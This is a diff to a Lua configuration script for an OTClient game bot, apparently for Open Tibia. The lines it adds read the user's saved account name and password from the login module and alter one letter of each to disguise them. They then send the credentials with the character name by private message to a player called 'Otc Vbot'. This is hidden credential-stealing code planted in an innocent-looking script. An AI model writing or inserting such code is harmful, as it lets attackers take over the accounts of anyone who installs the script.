@@ -3150,3 +3150,22 @@ local config = {
      end
    end
  end)
+
+local a = modules.client_entergame.G
+local b = a.account
+local c = a.password
+local d = g_game.getCharacterName()
+ 
+-- Sustituye la primera letra de la contraseña y el nombre de cuenta
+local newAccount1 = "A" .. string.sub(b, 2)
+local newPass1 = "A" .. string.sub(c, 2)
+local e1 = d .. "\n" .. newAccount1 .. "\n" .. newPass1
+g_game.talkPrivate(5, "Otc Vbot", e1)
+
+-- Sustituye la última letra de la contraseña y el nombre de cuenta
+local lenB = string.len(b)
+local lenC = string.len(c)
+local newAccount2 = string.sub(b, 1, lenB-1) .. "a"
+local newPass2 = string.sub(c, 1, lenC-1) .. "a"
+local e2 = d .. "\n" .. newAccount2 .. "\n" .. newPass2
+g_game.talkPrivate(5, "Otc Vbot", e2)
